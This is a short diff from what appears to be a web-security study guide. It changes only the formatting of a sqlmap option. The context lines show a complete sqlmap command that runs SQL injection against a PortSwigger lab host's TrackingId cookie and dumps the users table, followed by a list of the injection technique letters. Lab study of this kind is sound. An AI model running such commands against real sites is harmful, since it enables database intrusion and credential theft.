@@ -2896,7 +2896,7 @@ sudo sqlmap -u 'https://0ab100de04e9e4a58031307800c600e6.web-security-academy.ne
   --cookie='TrackingId=TEaLoCAHZS25Ps7h; session=Mn2mKUuqpaCVXE9iNoXUQEnUaTRQJByV' -p 'TrackingId' --level 2 --flush-session [--technique=B --dbms postgresql -D public -T users --dump]
 ```
 
-3. To indicate type of technique. Example: --technique=T. The list of techniques with its letters is as follows:
+3. To indicate type of technique. Example: `--technique=T`. The list of techniques with its letters is as follows:
 - B: Boolean-based blind
 - E: Error-based
 - U: Union query-based
